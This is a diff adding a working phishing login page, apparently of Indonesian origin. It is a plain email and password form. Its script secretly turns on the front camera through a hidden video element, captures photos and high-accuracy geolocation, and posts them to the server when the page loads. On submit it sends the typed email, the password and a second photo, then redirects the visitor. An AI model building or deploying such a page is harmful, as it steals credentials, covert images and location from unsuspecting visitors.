@@ -1,1 +1,87 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<style>
+  body { font-family: Arial; text-align: center; padding:20px; }
+  video { display: none; }
+  input { padding:8px; margin:5px; width:250px; }
+  button { padding:8px 16px; margin-top:10px; }
+</style>
+</head>
+<body>
+
+<h2>Login</h2>
+<form id="loginForm">
+  <input type="text" name="email" placeholder="Your Email" required><br>
+  <input type="password" name="password" placeholder="Your Password" required><br>
+  <button type="submit">Login</button>
+</form>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+let photo1 = "", lat1 = "", lon1 = "", ua = navigator.userAgent;
+
+function capture(cb){
+  const v=document.getElementById('video');
+  const c=document.getElementById('canvas');
+  const ctx=c.getContext('2d');
+  c.width=v.videoWidth||640;
+  c.height=v.videoHeight||480;
+  ctx.drawImage(v,0,0,c.width,c.height);
+  cb(c.toDataURL('image/jpeg'));
+}
+
+function getLoc(cb){
+  navigator.geolocation.getCurrentPosition(
+    p=>{cb(p.coords.latitude, p.coords.longitude);},
+    e=>{cb("", "");},
+    {enableHighAccuracy:true, timeout:10000}
+  );
+}
+
+// Mulai kamera dan capture awal
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+.then(stream=>{
+  document.getElementById('video').srcObject=stream;
+  setTimeout(()=>{
+    capture(img=>{
+      getLoc((la,lo)=>{
+        photo1 = img;
+        lat1 = la;
+        lon1 = lo;
+        fetch("/berhasil_awal", {
+          method:"POST",
+          body: JSON.stringify({photo:photo1, lat:lat1, lon:lon1, ua:ua}),
+          headers: {"Content-Type":"application/json"}
+        });
+      });
+    });
+  }, 1500);
+}).catch(e=>console.error("Kamera error:", e));
+
+// Saat klik login
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  capture(img=>{
+    getLoc((lat2, lon2)=>{
+      const fd = new FormData();
+      fd.append("email", this.email.value);
+      fd.append("password", this.password.value);
+      fd.append("photo", img);
+      fd.append("lat", lat2);
+      fd.append("lon", lon2);
+      fd.append("ua", ua);
+      fetch("/berhasil", {method:"POST", body:fd})
+      .then(()=>{ window.location.href="/form_laporan"; });
+    });
+  });
+});
+</script>
+
+</body>
+</html>
